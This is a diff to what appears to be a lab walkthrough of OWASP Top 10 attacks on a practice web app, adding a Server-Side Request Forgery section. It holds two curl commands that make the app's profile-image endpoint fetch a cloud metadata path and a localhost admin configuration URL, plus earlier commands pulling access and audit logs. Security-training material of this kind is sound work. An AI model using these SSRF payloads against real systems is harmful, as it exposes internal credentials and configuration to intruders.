@@ -133,3 +133,15 @@ cat access.log
 curl "http://172.20.0.106:3000/support/logs/audit.json" -o audit.json
 cat audit.json | jq
 ```
+
+### A10:2021 Server-Side Request Forgery - SSRF
+
+```bash
+curl -X POST victim:3000/profile/image/url \
+     -H "Content-Type: application/json" \
+     -d '{"imageUrl":"http://1.2.3.4/latest/meta-data"}'
+
+curl -X POST victim:3000/profile/image/url \
+     -H "Content-Type: application/json" \
+     -d '{"imageUrl":"http://localhost:3000/rest/admin/application-configuration"}'
+```
